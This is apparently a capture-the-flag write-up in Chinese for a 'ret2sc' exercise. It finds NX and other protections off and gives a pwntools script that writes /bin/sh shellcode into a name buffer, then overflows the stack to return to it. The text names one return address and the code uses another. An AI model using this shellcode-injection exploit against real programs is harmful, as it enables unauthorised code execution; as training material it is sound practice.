![image](https://user-images.githubusercontent.com/91378841/146679658-522d7fe2-aceb-4569-9f05-c203d13a2160.png)   
發現到Stack, PIE, NX是關的
![image](https://user-images.githubusercontent.com/91378841/146801760-664e0b5d-78ce-4bc9-9716-a4e66fc7cac1.png)   
嘗試執行程式
NX是關閉的狀態，因此嘗試用shellcode解
![image](https://user-images.githubusercontent.com/91378841/146801879-ccfb27fc-d5b7-436d-b995-073c80c0a670.png)   
在name處塞入shellcode，之後再讓程式指回601060
撰寫exploit如下
```python
from pwn import *
context.arch="amd64"
#r=remote('120.114.62.211','2122')
r=process("./ret2sc")
#shellcode="\x50\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\xb0\x3b\x0f\x05";
shellcode="\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";
r.sendafter(':',shellcode)

#r.sendafter(":",asm(shellcraft.sh()))
shellcode_address=0x601080
r.recvuntil(':')
r.sendline(b'a'*40+p64(shellcode_address))
r.interactive()
```
